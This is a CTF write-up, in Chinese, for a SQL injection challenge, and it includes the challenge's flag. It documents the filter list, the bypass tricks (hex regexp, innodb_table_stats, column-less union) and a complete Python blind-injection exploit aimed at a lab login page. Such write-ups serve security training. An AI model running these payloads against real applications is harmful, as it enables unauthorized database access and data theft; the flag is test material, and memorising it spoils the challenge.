## sql injection

### [题目考点]：

```
1. sql盲注
2. information_schema绕过
3. 无列名注入
```

### [Flag]:
`flag{584d6b4a-0c95-45ae-a2a3-ebdf7cac5cfc}`

### [题目环境]：
```
1. Linux alpine
2. Nginx
3. MariaDB
4. PHP 7.3
```

### [题目writeup]：

1. fuzz，发现过滤了如下字符

```
' ','=','<','>','^','$','-',';','&','+','or','and','`','\'','like','insert','limit','update','delete','into','if','mid','substr','sleep','benchmark','load_file','outfile','./','/*','*/'
```

2. 登陆界面尝试万能密码"||1#，存在注入点

3. 根据是否登陆成功进行布尔盲注

4. 过滤空格可以使用括号或\n绕过

5. =、like均被过滤，使用regexp('^xxx')绕过，但^被过滤，使用0x十六进制绕过

6. or和information_schema被过滤，使用mysql.innodb_table_stats获取表名，注意数据库管理系统为MariaDB，不是mysql，无sys模式，故无法使用sys.schema_table_statistics_with_buffer绕过

7. 无法获取列名，进行无列名注入：

   `select(group_concat(b))from((select(1)b)union(select\n*\nfrom(f1ag)))a`

exp如下，每一步给出多种payload，均可以实现注入：

```python
import requests
import time

url="http://10.212.27.23:8749/login.php"
lists = "1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ}{,-."

def exp(payload, len):
	info=''
	for i in range(1,len):
		for c in lists:
			payload2 = payload % ((info+c).encode().hex())
			resp=requests.post(url,data={'username':payload2,'password':'1'})
			# print(resp.text)
			if('home' in resp.text):
				info+=c
				print(info)
				break
	print()

# 库名
payload='"||(select(database()))regexp(0x5e%s)||"'
payload='"||(select(database()))regexp(0x5e%s)#'
exp(payload,5)

# 表名
payload='"||(select(group_concat(table_name))from(mysql.innodb_table_stats)where((database_name)regexp(database())))regexp(0x5e%s)||"'
payload='"||(select(group_concat(table_name))from(mysql.innodb_table_stats)where((database_name)regexp(database())))regexp(0x5e%s)#'
exp(payload, 10)

# flag(无列名注入)
payload='"union(select(b),(2)from(((select(1)b)union(select\n*\nfrom(f1ag)))a)where(b)regexp(0x5e66%s))#'
payload='"||(select(group_concat(b))from((select(1)b)union(select\n*\nfrom(f1ag)))a)regexp(0x5e%s)#'
payload='"||(select\n*\nfrom(f1ag))regexp(0x5e%s)#' # 只有表f1ag列数为1时才能使用
exp(payload, 50)

```

